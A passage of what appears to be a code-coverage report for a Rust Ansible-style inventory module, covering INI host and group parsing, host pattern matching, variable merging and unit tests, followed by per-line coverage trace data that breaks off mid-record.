is_children_section = false;\n                }\n\n                // Create group if it doesn't exist\n                self.groups\n                    .entry(current_group.clone())\n                    .or_insert_with(|| Group::new(\u0026current_group));\n\n                continue;\n            }\n\n            if is_vars_section {\n                // Parse group variable\n                if let Some((key, value)) = line.split_once('=') {\n                    let key = key.trim();\n                    let value = parse_ini_value(value.trim());\n\n                    if let Some(group) = self.groups.get_mut(\u0026current_group) {\n                        group.set_var(key, value);\n                    }\n                }\n            } else if is_children_section {\n                // Add child group\n                if let Some(group) = self.groups.get_mut(\u0026current_group) {\n                    group.add_child(line.to_string());\n                }\n\n                // Create child group if it doesn't exist\n                self.groups\n                    .entry(line.to_string())\n                    .or_insert_with(|| Group::new(line));\n            } else {\n                // Parse host definition\n                let host = Host::parse(line)?;\n                let host_name = host.name.clone();\n\n                // Add to current group\n                if let Some(group) = self.groups.get_mut(\u0026current_group) {\n                    group.add_host(host_name.clone());\n                }\n\n                // Add to all group\n                if current_group != \"all\" {\n                    if let Some(all_group) = self.groups.get_mut(\"all\") {\n                        all_group.add_host(host_name.clone());\n                    }\n                }\n\n                // Update or insert host\n                if let Some(existing) = self.hosts.get_mut(\u0026host_name) {\n                    existing.add_to_group(current_group.clone());\n                    existing.merge_vars(\u0026host.vars);\n                } else {\n                    let mut new_host = host;\n                    new_host.add_to_group(current_group.clone());\n                    new_host.add_to_group(\"all\".to_string());\n                    self.hosts.insert(host_name, new_host);\n                }\n            }\n        }\n\n        Ok(())\n    }\n\n    /// Compute parent group relationships from children\n    fn compute_group_parents(\u0026mut self) {\n        let children_map: HashMap\u003cString, Vec\u003cString\u003e\u003e = self\n            .groups\n            .iter()\n            .map(|(name, group)| (name.clone(), group.children.iter().cloned().collect()))\n            .collect();\n\n        for (parent_name, children) in children_map {\n            for child_name in children {\n                if let Some(child) = self.groups.get_mut(\u0026child_name) {\n                    child.add_parent(parent_name.clone());\n                }\n            }\n        }\n    }\n\n    /// Add a host to the inventory\n    pub fn add_host(\u0026mut self, host: Host) -\u003e InventoryResult\u003c()\u003e {\n        let name = host.name.clone();\n\n        // Add to all group\n        if let Some(all_group) = self.groups.get_mut(\"all\") {\n            all_group.add_host(name.clone());\n        }\n\n        // If host has no groups, add to ungrouped\n        if host.groups.is_empty() || (host.groups.len() == 1 \u0026\u0026 host.in_group(\"all\")) {\n            if let Some(ungrouped) = self.groups.get_mut(\"ungrouped\") {\n                ungrouped.add_host(name.clone());\n            }\n        }\n\n        self.hosts.insert(name, host);\n        Ok(())\n    }\n\n    /// Add a group to the inventory\n    pub fn add_group(\u0026mut self, group: Group) -\u003e InventoryResult\u003c()\u003e {\n        let name = group.name.clone();\n        self.groups.insert(name, group);\n        self.compute_group_parents();\n        Ok(())\n    }\n\n    /// Get a host by name\n    pub fn get_host(\u0026self, name: \u0026str) -\u003e Option\u003c\u0026Host\u003e {\n        self.hosts.get(name)\n    }\n\n    /// Get a mutable reference to a host by name\n    pub fn get_host_mut(\u0026mut self, name: \u0026str) -\u003e Option\u003c\u0026mut Host\u003e {\n        self.hosts.get_mut(name)\n    }\n\n    /// Get a group by name\n    pub fn get_group(\u0026self, name: \u0026str) -\u003e Option\u003c\u0026Group\u003e {\n        self.groups.get(name)\n    }\n\n    /// Get a mutable reference to a group by name\n    pub fn get_group_mut(\u0026mut self, name: \u0026str) -\u003e Option\u003c\u0026mut Group\u003e {\n        self.groups.get_mut(name)\n    }\n\n    /// Get all hosts\n    pub fn hosts(\u0026self) -\u003e impl Iterator\u003cItem = \u0026Host\u003e {\n        self.hosts.values()\n    }\n\n    /// Get all hosts as a vector\n    pub fn get_all_hosts(\u0026self) -\u003e Vec\u003c\u0026Host\u003e {\n        self.hosts.values().collect()\n    }\n\n    /// Get all groups\n    pub fn groups(\u0026self) -\u003e impl Iterator\u003cItem = \u0026Group\u003e {\n        self.groups.values()\n    }\n\n    /// Get all host names\n    pub fn host_names(\u0026self) -\u003e impl Iterator\u003cItem = \u0026String\u003e {\n        self.hosts.keys()\n    }\n\n    /// Get all group names\n    pub fn group_names(\u0026self) -\u003e impl Iterator\u003cItem = \u0026String\u003e {\n        self.groups.keys()\n    }\n\n    /// Get hosts matching a pattern\n    ///\n    /// Supported patterns:\n    /// - `all` - all hosts\n    /// - `hostname` - specific host\n    /// - `groupname` - all hosts in group\n    /// - `host1:host2` - multiple hosts/groups (union)\n    /// - `group1:\u0026group2` - intersection\n    /// - `group1:!group2` - exclusion\n    /// - `~regex` - regex match on hostname\n    /// - `*` - wildcard match\n    pub fn get_hosts_for_pattern(\u0026self, pattern: \u0026str) -\u003e InventoryResult\u003cVec\u003c\u0026Host\u003e\u003e {\n        let pattern = pattern.trim();\n\n        if pattern.is_empty() {\n            return Ok(Vec::new());\n        }\n\n        // Handle \"all\"\n        if pattern == \"all\" || pattern == \"*\" {\n            return Ok(self.hosts.values().collect());\n        }\n\n        // Handle complex patterns with operators\n        if pattern.contains(':') {\n            return self.parse_complex_pattern(pattern);\n        }\n\n        // Handle regex pattern\n        if pattern.starts_with('~') {\n            let regex_str = \u0026pattern[1..];\n            let regex = Regex::new(regex_str)\n                .map_err(|_| InventoryError::InvalidPattern(pattern.to_string()))?;\n\n            return Ok(self\n                .hosts\n                .values()\n                .filter(|h| regex.is_match(\u0026h.name))\n                .collect());\n        }\n\n        // Handle glob/wildcard pattern\n        if pattern.contains('*') || pattern.contains('?') || pattern.contains('[') {\n            let regex_pattern = glob_to_regex(pattern);\n            let regex = Regex::new(\u0026regex_pattern)\n                .map_err(|_| InventoryError::InvalidPattern(pattern.to_string()))?;\n\n            return Ok(self\n                .hosts\n                .values()\n                .filter(|h| regex.is_match(\u0026h.name))\n                .collect());\n        }\n\n        // Try as group name first\n        if let Some(group) = self.groups.get(pattern) {\n            return Ok(self.get_hosts_in_group_recursive(group));\n        }\n\n        // Try as host name\n        if let Some(host) = self.hosts.get(pattern) {\n            return Ok(vec![host]);\n        }\n\n        // Pattern didn't match anything\n        Err(InventoryError::InvalidPattern(format!(\n            \"No hosts matched pattern: {}\",\n            pattern\n        )))\n    }\n\n    /// Parse a complex pattern with operators\n    fn parse_complex_pattern(\u0026self, pattern: \u0026str) -\u003e InventoryResult\u003cVec\u003c\u0026Host\u003e\u003e {\n        let mut result: HashSet\u003c\u0026str\u003e = HashSet::new();\n        let mut first = true;\n\n        // Split by : but not inside brackets\n        let parts = split_pattern(pattern);\n\n        for part in parts {\n            let part = part.trim();\n\n            if part.is_empty() {\n                continue;\n            }\n\n            if part.starts_with('\u0026') {\n                // Intersection\n                let sub_pattern = \u0026part[1..];\n                let sub_hosts = self.get_hosts_for_pattern(sub_pattern)?;\n                let sub_set: HashSet\u003c\u0026str\u003e = sub_hosts.iter().map(|h| h.name.as_str()).collect();\n                result = result.intersection(\u0026sub_set).cloned().collect();\n            } else if part.starts_with('!') {\n                // Exclusion\n                let sub_pattern = \u0026part[1..];\n                let sub_hosts = self.get_hosts_for_pattern(sub_pattern)?;\n                for host in sub_hosts {\n                    result.remove(host.name.as_str());\n                }\n            } else {\n                // Union\n                let sub_hosts = self.get_hosts_for_pattern(part)?;\n\n                if first {\n                    for host in sub_hosts {\n                        result.insert(\u0026host.name);\n                    }\n                    first = false;\n                } else {\n                    for host in sub_hosts {\n                        result.insert(\u0026host.name);\n                    }\n                }\n            }\n        }\n\n        Ok(result\n            .into_iter()\n            .filter_map(|name| self.hosts.get(name))\n            .collect())\n    }\n\n    /// Get all hosts in a group, including hosts from child groups\n    fn get_hosts_in_group_recursive(\u0026self, group: \u0026Group) -\u003e Vec\u003c\u0026Host\u003e {\n        let mut hosts: HashSet\u003c\u0026str\u003e = HashSet::new();\n\n        // Add direct hosts\n        for host_name in \u0026group.hosts {\n            hosts.insert(host_name);\n        }\n\n        // Add hosts from child groups\n        for child_name in \u0026group.children {\n            if let Some(child) = self.groups.get(child_name) {\n                for host in self.get_hosts_in_group_recursive(child) {\n                    hosts.insert(\u0026host.name);\n                }\n            }\n        }\n\n        hosts\n            .into_iter()\n            .filter_map(|name| self.hosts.get(name))\n            .collect()\n    }\n\n    /// Get the group hierarchy for a host (from most specific to least specific)\n    pub fn get_host_group_hierarchy(\u0026self, host: \u0026Host) -\u003e GroupHierarchy {\n        let mut hierarchy = GroupHierarchy::new();\n        let mut visited = HashSet::new();\n\n        fn collect_parents(\n            inventory: \u0026Inventory,\n            group_name: \u0026str,\n            hierarchy: \u0026mut GroupHierarchy,\n            visited: \u0026mut HashSet\u003cString\u003e,\n        ) {\n            if visited.contains(group_name) {\n                return;\n            }\n            visited.insert(group_name.to_string());\n            hierarchy.push(group_name);\n\n            if let Some(group) = inventory.groups.get(group_name) {\n                for parent in \u0026group.parents {\n                    collect_parents(inventory, parent, hierarchy, visited);\n                }\n            }\n        }\n\n        for group_name in \u0026host.groups {\n            collect_parents(self, group_name, \u0026mut hierarchy, \u0026mut visited);\n        }\n\n        hierarchy\n    }\n\n    /// Get merged variables for a host (respecting group hierarchy)\n    pub fn get_host_vars(\u0026self, host: \u0026Host) -\u003e IndexMap\u003cString, serde_yaml::Value\u003e {\n        let mut vars = IndexMap::new();\n\n        // Get group hierarchy\n        let hierarchy = self.get_host_group_hierarchy(host);\n\n        // Apply variables from parent to child (so child overrides parent)\n        for group_name in hierarchy.parent_to_child() {\n            if let Some(group) = self.groups.get(group_name) {\n                for (key, value) in \u0026group.vars {\n                    vars.insert(key.clone(), value.clone());\n                }\n            }\n        }\n\n        // Apply host-specific variables (highest precedence)\n        for (key, value) in \u0026host.vars {\n            vars.insert(key.clone(), value.clone());\n        }\n\n        vars\n    }\n\n    /// Count total hosts\n    pub fn host_count(\u0026self) -\u003e usize {\n        self.hosts.len()\n    }\n\n    /// Count total groups\n    pub fn group_count(\u0026self) -\u003e usize {\n        self.groups.len()\n    }\n}\n\n/// Split pattern by : but not inside brackets\nfn split_pattern(pattern: \u0026str) -\u003e Vec\u003c\u0026str\u003e {\n    let mut parts = Vec::new();\n    let mut start = 0;\n    let mut bracket_depth: usize = 0;\n\n    for (i, ch) in pattern.char_indices() {\n        match ch {\n            '[' =\u003e bracket_depth += 1,\n            ']' =\u003e bracket_depth = bracket_depth.saturating_sub(1),\n            ':' if bracket_depth == 0 =\u003e {\n                parts.push(\u0026pattern[start..i]);\n                start = i + 1;\n            }\n            _ =\u003e {}\n        }\n    }\n\n    parts.push(\u0026pattern[start..]);\n    parts\n}\n\n/// Convert a glob pattern to regex\nfn glob_to_regex(pattern: \u0026str) -\u003e String {\n    let mut regex = String::from(\"^\");\n\n    for ch in pattern.chars() {\n        match ch {\n            '*' =\u003e regex.push_str(\".*\"),\n            '?' =\u003e regex.push('.'),\n            '[' | ']' | '(' | ')' | '{' | '}' | '.' | '+' | '^' | '$' | '|' | '\\\\' =\u003e {\n                regex.push('\\\\');\n                regex.push(ch);\n            }\n            _ =\u003e regex.push(ch),\n        }\n    }\n\n    regex.push('$');\n    regex\n}\n\n/// Parse INI value (handle quoted strings, lists, etc.)\nfn parse_ini_value(value: \u0026str) -\u003e serde_yaml::Value {\n    let value = value.trim();\n\n    // Handle quoted strings\n    if (value.starts_with('\"') \u0026\u0026 value.ends_with('\"'))\n        || (value.starts_with('\\'') \u0026\u0026 value.ends_with('\\''))\n    {\n        return serde_yaml::Value::String(value[1..value.len() - 1].to_string());\n    }\n\n    // Handle booleans\n    match value.to_lowercase().as_str() {\n        \"true\" | \"yes\" | \"on\" =\u003e return serde_yaml::Value::Bool(true),\n        \"false\" | \"no\" | \"off\" =\u003e return serde_yaml::Value::Bool(false),\n        _ =\u003e {}\n    }\n\n    // Handle numbers\n    if let Ok(n) = value.parse::\u003ci64\u003e() {\n        return serde_yaml::Value::Number(n.into());\n    }\n    if let Ok(n) = value.parse::\u003cf64\u003e() {\n        // Use From\u003ci64\u003e for the integer part, or convert to string for precision\n        if n.fract() == 0.0 \u0026\u0026 n \u003e= i64::MIN as f64 \u0026\u0026 n \u003c= i64::MAX as f64 {\n            return serde_yaml::Value::Number((n as i64).into());\n        }\n        // For floats, we need to use a different approach as serde_yaml may not support from_f64\n        return serde_yaml::Value::Number(serde_yaml::Number::from(n as i64));\n    }\n\n    // Default to string\n    serde_yaml::Value::String(value.to_string())\n}\n\n/// Convert JSON value to YAML value\nfn json_to_yaml(value: \u0026serde_json::Value) -\u003e serde_yaml::Value {\n    match value {\n        serde_json::Value::Null =\u003e serde_yaml::Value::Null,\n        serde_json::Value::Bool(b) =\u003e serde_yaml::Value::Bool(*b),\n        serde_json::Value::Number(n) =\u003e {\n            if let Some(i) = n.as_i64() {\n                serde_yaml::Value::Number(i.into())\n            } else if let Some(f) = n.as_f64() {\n                // Convert float to integer if it has no fractional part\n                if f.fract() == 0.0 \u0026\u0026 f \u003e= i64::MIN as f64 \u0026\u0026 f \u003c= i64::MAX as f64 {\n                    serde_yaml::Value::Number((f as i64).into())\n                } else {\n                    serde_yaml::Value::Number((f as i64).into())\n                }\n            } else {\n                serde_yaml::Value::Number(0.into())\n            }\n        }\n        serde_json::Value::String(s) =\u003e serde_yaml::Value::String(s.clone()),\n        serde_json::Value::Array(arr) =\u003e {\n            serde_yaml::Value::Sequence(arr.iter().map(json_to_yaml).collect())\n        }\n        serde_json::Value::Object(obj) =\u003e {\n            let mut map = serde_yaml::Mapping::new();\n            for (k, v) in obj {\n                map.insert(serde_yaml::Value::String(k.clone()), json_to_yaml(v));\n            }\n            serde_yaml::Value::Mapping(map)\n        }\n    }\n}\n\nimpl std::fmt::Display for Inventory {\n    fn fmt(\u0026self, f: \u0026mut std::fmt::Formatter\u003c'_\u003e) -\u003e std::fmt::Result {\n        writeln!(\n            f,\n            \"Inventory ({} hosts, {} groups)\",\n            self.hosts.len(),\n            self.groups.len()\n        )?;\n\n        for group in self.groups.values() {\n            if group.hosts.is_empty() \u0026\u0026 group.children.is_empty() {\n                continue;\n            }\n            writeln!(f, \"  [{}]\", group.name)?;\n            for host_name in \u0026group.hosts {\n                if let Some(host) = self.hosts.get(host_name) {\n                    writeln!(f, \"    {}\", host)?;\n                }\n            }\n        }\n\n        Ok(())\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_empty_inventory() {\n        let inv = Inventory::new();\n        assert_eq!(inv.host_count(), 0);\n        assert!(inv.groups.contains_key(\"all\"));\n        assert!(inv.groups.contains_key(\"ungrouped\"));\n    }\n\n    #[test]\n    fn test_add_host() {\n        let mut inv = Inventory::new();\n        let host = Host::new(\"webserver1\");\n        inv.add_host(host).unwrap();\n\n        assert_eq!(inv.host_count(), 1);\n        assert!(inv.get_host(\"webserver1\").is_some());\n    }\n\n    #[test]\n    fn test_parse_ini() {\n        let mut inv = Inventory::new();\n        inv.parse_ini(\n            r#\"\n[webservers]\nweb1 ansible_host=10.0.0.1\nweb2 ansible_host=10.0.0.2\n\n[databases]\ndb1 ansible_host=10.0.0.10\n\n[webservers:vars]\nhttp_port=80\n\n[production:children]\nwebservers\ndatabases\n        \"#,\n        )\n        .unwrap();\n\n        assert_eq!(inv.host_count(), 3);\n        assert!(inv.get_group(\"webservers\").is_some());\n        assert!(inv.get_group(\"databases\").is_some());\n        assert!(inv.get_group(\"production\").is_some());\n\n        let webservers = inv.get_group(\"webservers\").unwrap();\n        assert!(webservers.has_host(\"web1\"));\n        assert!(webservers.has_host(\"web2\"));\n        assert!(webservers.has_var(\"http_port\"));\n    }\n\n    #[test]\n    fn test_pattern_matching() {\n        let mut inv = Inventory::new();\n        inv.parse_ini(\n            r#\"\n[webservers]\nweb1\nweb2\n\n[databases]\ndb1\n        \"#,\n        )\n        .unwrap();\n\n        let all = inv.get_hosts_for_pattern(\"all\").unwrap();\n        assert_eq!(all.len(), 3);\n\n        let webs = inv.get_hosts_for_pattern(\"webservers\").unwrap();\n        assert_eq!(webs.len(), 2);\n\n        let single = inv.get_hosts_for_pattern(\"web1\").unwrap();\n        assert_eq!(single.len(), 1);\n    }\n\n    #[test]\n    fn test_glob_pattern() {\n        let mut inv = Inventory::new();\n        inv.add_host(Host::new(\"web1\")).unwrap();\n        inv.add_host(Host::new(\"web2\")).unwrap();\n        inv.add_host(Host::new(\"db1\")).unwrap();\n\n        let webs = inv.get_hosts_for_pattern(\"web*\").unwrap();\n        assert_eq!(webs.len(), 2);\n    }\n\n    #[test]\n    fn test_regex_pattern() {\n        let mut inv = Inventory::new();\n        inv.add_host(Host::new(\"web1\")).unwrap();\n        inv.add_host(Host::new(\"web2\")).unwrap();\n        inv.add_host(Host::new(\"db1\")).unwrap();\n\n        let webs = inv.get_hosts_for_pattern(\"~web\\\\d+\").unwrap();\n        assert_eq!(webs.len(), 2);\n    }\n}\n","traces":[{"line":79,"address":[31778656],"length":1,"stats":{"Line":0}},{"line":80,"address":[31778664],"length":1,"stats":{"Line":0}},{"line":86,"address":[31827593,31826912,31827565],"length":1,"stats":{"Line":1}},{"line":88,"address":[31826953],"length":1,"stats":{"Line":1}},{"line":89,"address":[31826966],"length":1,"stats":{"Line":1}},{"line":94,"address":[31827239,31827216,31827571,31827148],"length":1,"stats":{"Line":2}},{"line":95,"address":[31827344,31827448],"length":1,"stats":{"Line":2}},{"line":97,"address":[31827543,31827353,31827480,31827407],"length":1,"stats":{"Line":2}},{"line":99,"address":[31827515],"length":1,"stats":{"Line":1}},{"line":103,"address":[],"length":0,"stats":{"Line":0}},{"line":104,"address":[],"length":0,"stats":{"Line":0}},{"line":105,"address":[],"length":0,"stats":{"Line":0}},{"line":106,"address":[],"length":0,"stats":{"Line":0}},{"line":108,"address":[],"length":0,"stats":{"Line":0}},{"line":109,"address":[],"length":0,"stats":{"Line":0}},{"line":110,"address":[],"length":0,"stats":{"Line":0}},{"line":111,"address":[],"length":0,"stats":{"Line":0}},{"line":113,"address":[],"length":0,"stats":{"Line":0}},{"line":114,"address":[],"length":0,"stats":{"Line":0}},{"line":115,"address":[],"length":0,"stats":{"Line":0}},{"line":120,"address":[],"length":0,"stats":{"Line":0}},{"line":122,"address":[],"length":0,"stats":{"Line":0}},{"line":126,"address":[31828880,31829279,31829285],"length":1,"stats":{"Line":0}},{"line":131,"address":[31828973,31829087],"length":1,"stats":{"Line":0}},{"line":132,"address":[31829162,31829097],"length":1,"stats":{"Line":0}},{"line":133,"address":[31829242],"length":1,"stats":{"Line":0}},{"line":138,"address":[31829328],"length":1,"stats":{"Line":0}},{"line":139,"address":[30529728,30529742],"length":1,"stats":{"Line":0}},{"line":141,"address":[31829824,31829714],"length":1,"stats":{"Line":0}},{"line":142,"address":[31831380,31829846,31831222],"length":1,"stats":{"Line":0}},{"line":143,"address":[31831061,31830072,31829990],"length":1,"stats":{"Line":0}},{"line":144,"address":[31830045],"length":1,"stats":{"Line":0}},{"line":146,"address":[31830289,31830106],"length":1,"stats":{"Line":0}},{"line":147,"address":[31830900,31830256],"length":1,"stats":{"Line":0}},{"line":148,"address":[31830447,31830354],"length":1,"stats":{"Line":0}},{"line":149,"address":[31830695,31830512],"length":1,"stats":{"Line":0}},{"line":151,"address":[31830419,31830745],"length":1,"stats":{"Line":0}},{"line":156,"address":[31831354],"length":1,"stats":{"Line":0}},{"line":160,"address":[31802657,31801136,31802665],"length":1,"stats":{"Line":0}},{"line":162,"address":[31801207,31801449],"length":1,"stats":{"Line":0}},{"line":163,"address":[31801544],"length":1,"stats":{"Line":0}},{"line":164,"address":[31801731,31801660],"length":1,"stats":{"Line":0}},{"line":165,"address":[31801782],"length":1,"stats":{"Line":0}},{"line":171,"address":[31801592],"length":1,"stats":{"Line":0}},{"line":172,"address":[31801632,31802024],"length":1,"stats":{"Line":0}},{"line":173,"address":[31802108,31802663],"length":1,"stats":{"Line":0}},{"line":177,"address":[31802065],"length":1,"stats":{"Line":0}},{"line":178,"address":[31802286,31802357],"length":1,"stats":{"Line":0}},{"line":179,"address":[31802427],"length":1,"stats":{"Line":0}},{"line":182,"address":[31802390],"length":1,"stats":{"Line":0}},{"line":186,"address":[31807274,31805536,31808687],"length":1,"stats":{"Line":0}},{"line":187,"address":[31805887,31805629],"length":1,"stats":{"Line":0}},{"line":188,"address":[31806017,31805965,31808685],"length":1,"stats":{"Line":0}},{"line":189,"address":[31806185],"length":1,"stats":{"Line":0}},{"line":191,"address":[31806344,31808508,31806264],"length":1,"stats":{"Line":0}},{"line":192,"address":[31806414],"length":1,"stats":{"Line":0}},{"line":194,"address":[30528640,30528654],"length":1,"stats":{"Line":0}},{"line":198,"address":[31807476,31807524,31808610],"length":1,"stats":{"Line":0}},{"line":199,"address":[31807701,31807780],"length":1,"stats":{"Line":0}},{"line":201,"address":[31808056,31808466,31808125],"length":1,"stats":{"Line":0}},{"line":202,"address":[31808188,31808218],"length":1,"stats":{"Line":0}},{"line":205,"address":[31808238,31808211],"length":1,"stats":{"Line":0}},{"line":206,"address":[31808262],"length":1,"stats":{"Line":0}},{"line":207,"address":[31808318],"length":1,"stats":{"Line":0}},{"line":209,"address":[31807483,31807718,31808663,31808513,31806456,31808612,31808471,31806383,31808572,31808228,31808088],"length":1,"stats":{"Line":0}},{"line":211,"address":[31806517],"length":1,"stats":{"Line":0}},{"line":213,"address":[31806599],"length":1,"stats":{"Line":0}},{"line":217,"address":[31806709,31806796],"length":1,"stats":{"Line":0}},{"line":218,"address":[31807165,31807096],"length":1,"stats":{"Line":0}},{"line":219,"address":[31807250,31807228],"length":1,"stats":{"Line":0}},{"line":224,"address":[31805994],"length":1,"stats":{"Line":0}},{"line":228,"address":[31804430,31802720,31805509],"length":1,"stats":{"Line":0}},{"line":229,"address":[31802813,31803055],"length":1,"stats":{"Line":0}},{"line":230,"address":[31803133,31803185,31805507],"length":1,"stats":{"Line":0}},{"line":231,"address":[31803353],"length":1,"stats":{"Line":0}},{"line":233,"address":[31803512,31803432],"length":1,"stats":{"Line":0}},{"line":234,"address":[31803582],"length":1,"stats":{"Line":0}},{"line":236,"address":[31804524],"length":1,"stats":{"Line":0}},{"line":240,"address":[31804624,31804675,31805467],"length":1,"stats":{"Line":0}},{"line":241,"address":[31804852,31804931],"length":1,"stats":{"Line":0}},{"line":243,"address":[31805207,31805276],"length":1,"stats":{"Line":0}},{"line":244,"address":[31805339,31805361],"length":1,"stats":{"Line":0}},{"line":246,"address":[31804631,31805354,31805426,31805239,31805363,31804869,31803551,31803624],"length":1,"stats":{"Line":0}},{"line":247,"address":[31803685],"length":1,"stats":{"Line":0}},{"line":249,"address":[30528608,30528622],"length":1,"stats":{"Line":0}},{"line":253,"address":[31803865,31803952],"length":1,"stats":{"Line":0}},{"line":254,"address":[31804252,31804321],"length":1,"stats":{"Line":0}},{"line":255,"address":[31804384,31804406],"length":1,"stats":{"Line":0}},{"line":260,"address":[31803162],"length":1,"stats":{"Line":0}},{"line":264,"address":[31825743,31825877,31823744],"length":1,"stats":{"Line":0}},{"line":268,"address":[31823807],"length":1,"stats":{"Line":0}},{"line":270,"address":[30529660,30529632],"length":1,"stats":{"Line":0}},{"line":271,"address":[31824178,31824110],"length":1,"stats":{"Line":0}},{"line":273,"address":[31824375,31824185],"length":1,"stats":{"Line":0}},{"line":274,"address":[31824454],"length":1,"stats":{"Line":0}},{"line":275,"address":[31824627,31824695],"length":1,"stats":{"Line":0}},{"line":276,"address":[30529536,30529550],"length":1,"stats":{"Line":0}},{"line":277,"address":[31824889,31824986],"length":1,"stats":{"Line":0}},{"line":278,"address":[31825795,31824975,31824995],"length":1,"stats":{"Line":0}},{"line":279,"address":[31825249,31825172],"length":1,"stats":{"Line":0}},{"line":280,"address":[31825525],"length":1,"stats":{"Line":0}},{"line":285,"address":[31824499],"length":1,"stats":{"Line":0}},{"line":289,"address":[31794720,31795526,31795848],"length":1,"stats":{"Line":0}},{"line":290,"address":[31794805,31795027,31794946],"length":1,"stats":{"Line":0}},{"line":293,"address":[30528434,30528416],"length":1,"stats":{"Line":0}},{"line":295,"address":[31795233],"length":1,"stats":{"Line":0}},{"line":296,"address":[31795425],"length":1,"stats":{"Line":0}},{"line":297,"address":[31795262,31795330],"length":1,"stats":{"Line":0}},{"line":301,"address":[31795542,31795291],"length":1,"stats":{"Line":0}},{"line":302,"address":[31795561,31795655],"length":1,"stats":{"Line":0}},{"line":304,"address":[31795777],"length":1,"stats":{"Line":0}},{"line":308,"address":[31794394,31794550,31792288],"length":1,"stats":{"Line":0}},{"line":309,"address":[31792360],"length":1,"stats":{"Line":0}},{"line":311,"address":[31792542,31793630],"length":1,"stats":{"Line":0}},{"line":313,"address":[31792948,31792817,31792675],"length":1,"stats":{"Line":0}},{"line":314,"address":[31793281,31793008,31793165],"length":1,"stats":{"Line":0}},{"line":317,"address":[31793436,31793305,31793035],"length":1,"stats":{"Line":0}},{"line":318,"address":[31793529,31793734],"length":1,"stats":{"Line":0}},{"line":319,"address":[31793886,31793774],"length":1,"stats":{"Line":0}},{"line":325,"address":[31792711],"length":1,"stats":{"Line":0}},{"line":329,"address":[31808704,31812601,31810937],"length":1,"stats":{"Line":0}},{"line":330,"address":[31808775],"length":1,"stats":{"Line":0}},{"line":332,"address":[31808803],"length":1,"stats":{"Line":0}},{"line":333,"address":[31808862],"length":1,"stats":{"Line":0}},{"line":335,"address":[31808899],"length":1,"stats":{"Line":0}},{"line":337,"address":[31809152,31808966],"length":1,"stats":{"Line":0}},{"line":338,"address":[31809408,31809215],"length":1,"stats":{"Line":0}},{"line":339,"address":[31809416],"length":1,"stats":{"Line":0}},{"line":340,"address":[31809617,31810914],"length":1,"stats":{"Line":0}},{"line":341,"address":[31809696],"length":1,"stats":{"Line":0}},{"line":344,"address":[31809754],"length":1,"stats":{"Line":0}},{"line":345,"address":[31809817,31809935],"length":1,"stats":{"Line":0}},{"line":346,"address":[31810097],"length":1,"stats":{"Line":0}},{"line":347,"address":[31810168],"length":1,"stats":{"Line":0}},{"line":352,"address":[31810314,31809840],"length":1,"stats":{"Line":0}},{"line":355,"address":[31810329],"length":1,"stats":{"Line":0}},{"line":356,"address":[31810511,31810443],"length":1,"stats":{"Line":0}},{"line":360,"address":[31810527,31810462],"length":1,"stats":{"Line":0}},{"line":361,"address":[31810583],"length":1,"stats":{"Line":0}},{"line":362,"address":[31810645],"length":1,"stats":{"Line":0}},{"line":363,"address":[31810759],"length":1,"stats":{"Line":0}},{"line":367,"address":[31810549,31810806],"length":1,"stats":{"Line":0}},{"line":374,"address":[31809283,31810995],"length":1,"stats":{"Line":0}},{"line":375,"address":[31811058,31811251],"length":1,"stats":{"Line":0}},{"line":376,"address":[31811259],"length":1,"stats":{"Line":0}},{"line":377,"address":[31811460],"length":1,"stats":{"Line":0}},{"line":379,"address":[31811544],"length":1,"stats":{"Line":0}},{"line":380,"address":[31811646,31811700],"length":1,"stats":{"Line":0}},{"line":382,"address":[31811670,31811743],"length":1,"stats":{"Line":0}},{"line":389,"address":[31811949,31811126],"length":1,"stats":{"Line":0}},{"line":390,"address":[31812080,31812009],"length":1,"stats":{"Line":0}},{"line":391,"address":[31812088],"length":1,"stats":{"Line":0}},{"line":392,"address":[31812259],"length":1,"stats":{"Line":0}},{"line":393,"address":[31812574,31812340],"length":1,"stats":{"Line":0}},{"line":394,"address":[31812446,31812493,31812579],"length":1,"stats":{"Line":0}},{"line":402,"address":[31809088],"length":1,"stats":{"Line":0}},{"line":406,"address":[31797312,31799684,31800999],"length":1,"stats":{"Line":0}},{"line":407,"address":[31797421],"length":1,"stats":{"Line":0}},{"line":408,"address":[31797453,31797527],"length":1,"stats":{"Line":0}},{"line":409,"address":[31797583,31800652,31800867],"length":1,"stats":{"Line":0}},{"line":410,"address":[31800684],"length":1,"stats":{"Line":0}},{"line":413,"address":[31797646,31797549],"length":1,"stats":{"Line":0}},{"line":414,"address":[31800519,31797702],"length":1,"stats":{"Line":0}},{"line":415,"address":[31800631,31800539],"length":1,"stats":{"Line":0}},{"line":416,"address":[31800624],"length":1,"stats":{"Line":0}},{"line":420,"address":[31797765,31797668],"length":1,"stats":{"Line":0}},{"line":421,"address":[31797821,31800312,31800506],"length":1,"stats":{"Line":0}},{"line":422,"address":[31800344],"length":1,"stats":{"Line":0}},{"line":425,"address":[31797884,31797787],"length":1,"stats":{"Line":0}},{"line":426,"address":[31800097,31797940,31800291],"length":1,"stats":{"Line":0}},{"line":427,"address":[31800129],"length":1,"stats":{"Line":0}},{"line":430,"address":[31797906,31798003],"length":1,"stats":{"Line":0}},{"line":431,"address":[31799698,31798059],"length":1,"stats":{"Line":0}},{"line":432,"address":[31799738,31800046,31799809],"length":1,"stats":{"Line":0}},{"line":433,"address":[31799891,31799825],"length":1,"stats":{"Line":0}},{"line":434,"address":[31799908,31799868,31799947],"length":1,"stats":{"Line":0}},{"line":435,"address":[31799924,31800000,31799961],"length":1,"stats":{"Line":0}},{"line":436,"address":[31800014,31800030,31799977],"length":1,"stats":{"Line":0}},{"line":437,"address":[31800020],"length":1,"stats":{"Line":0}},{"line":441,"address":[31798025,31798122,31799420],"length":1,"stats":{"Line":0}},{"line":442,"address":[31798178,31799404],"length":1,"stats":{"Line":0}},{"line":443,"address":[31799305],"length":1,"stats":{"Line":0}},{"line":444,"address":[31799339,31799425],"length":1,"stats":{"Line":0}},{"line":445,"address":[31799287],"length":1,"stats":{"Line":0}},{"line":448,"address":[31798253,31798144],"length":1,"stats":{"Line":0}},{"line":449,"address":[31799120,31799282,31798306],"length":1,"stats":{"Line":0}},{"line":450,"address":[31799152],"length":1,"stats":{"Line":0}},{"line":453,"address":[31798366,31798275],"length":1,"stats":{"Line":0}},{"line":454,"address":[31798419,31798937,31799099],"length":1,"stats":{"Line":0}},{"line":455,"address":[31798969],"length":1,"stats":{"Line":0}},{"line":458,"address":[31798388,31798479],"length":1,"stats":{"Line":0}},{"line":459,"address":[31798701,31798916,31798615],"length":1,"stats":{"Line":0}},{"line":460,"address":[31798733],"leng